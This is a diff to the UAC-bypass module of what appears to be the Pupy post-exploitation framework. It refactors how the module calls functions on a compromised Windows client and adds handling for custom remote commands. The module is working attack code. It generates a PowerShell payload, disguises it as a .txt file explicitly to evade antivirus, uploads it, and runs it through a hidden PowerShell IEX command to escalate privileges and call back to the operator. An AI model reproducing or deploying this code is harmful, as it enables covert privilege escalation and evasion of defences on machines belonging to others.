@@ -7,6 +7,7 @@ import os
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from rpyc.utils.classic import upload
 
+import shlex
 import pupygen
 import random
 import string
@@ -63,8 +64,11 @@ class BypassUAC(PupyModule):
 
     def run(self, args):
 
+        can_get_admin_access = self.client.remote(
+            'pupwinutils.security', 'can_get_admin_access', False)
+
         # Check if a UAC bypass can be done
-        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
+        if not can_get_admin_access():
             self.error('Your are not on the local administrator group.')
             return
 
@@ -104,11 +108,12 @@ class BypassUAC(PupyModule):
 
         # ------------------ Prepare the payload ------------------
 
-        ros = self.client.conn.modules['os']
-        tempdir = self.client.conn.modules['tempfile'].gettempdir()
+        rjoin = self.client.remote('os.path', 'join')
+        risfile = self.client.remote('os.path', 'isfile')
+        tempdir = self.client.remote('tempfile', 'gettempdir', False)
         random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
         local_file = ''
-        remotefile = ''
+        remote_file = ''
 
         if not args.exe and not args.restart:
             self.info('Using powershell payload')
@@ -144,19 +149,31 @@ class BypassUAC(PupyModule):
                 local_file = pupygen.generate_ps1(self.log, client_conf, x86=True)
 
             # change the ps1 to txt file to avoid AV detection
-            remotefile = ros.path.join(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="txt"))
+            remote_file = rjoin(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="txt"))
 
             cmd = u'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden ' \
-                  u'-noni -nop -c "cat %s | Out-String | IEX"' % remotefile
+                  u'-noni -nop -c "cat %s | Out-String | IEX"' % remote_file
 
         # use a custom exe to execute as admin
         elif args.exe:
-            self.info('Using custom executable')
-            if os.path.exists(args.exe):
+            cmd_args = shlex.split(args.exe, posix=False)
+            arg0, argv = cmd_args[0], cmd_args[1:]
+            argv = ' '.join(
+                repr(x) if ' ' in x else x for x in argv
+            )
+
+            if risfile(arg0):
+                self.info('Using remote cmd ({})'.format(args.exe))
+                cmd = args.exe
+
+            elif os.path.exists(arg0):
+                self.info('Using custom executable (local)')
                 local_file = args.exe
-                cmd = ros.path.join(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="exe"))
+                cmd = rjoin(
+                    tempdir, "{random_name}.{ext}".format(
+                        random_name=random_name, ext="exe")) + ' ' + argv
             else:
-                self.error('Executable file not found: %s' % args.exe)
+                self.error('Executable file not found: {}'.format(arg0))
                 return
 
         # restart the current executable as admin
@@ -171,9 +188,9 @@ class BypassUAC(PupyModule):
             cmd = self.client.desc['exec_path']
 
         # upload payload (ps1 or custom exe)
-        if not args.restart:
-            self.info("Uploading to %s" % remotefile)
-            upload(self.client.conn, local_file, remotefile)
+        if not args.restart and local_file:
+            self.info("Uploading to %s" % remote_file)
+            upload(self.client.conn, local_file, remote_file, chunk_size=1*1024*1024)
 
         # ------------------ Ready to launch the bypassuac ------------------
 
@@ -190,7 +207,7 @@ class BypassUAC(PupyModule):
             self.info("Waiting for a connection (take few seconds, 1 min max)...")
 
         # TO DO (remove ps1 file)
-        # ros.remove(remotefile) # not work if removed too fast
+        # ros.remove(remote_file) # not work if removed too fast
 
         # Remove generated ps1 file
         if not args.exe and not args.restart:
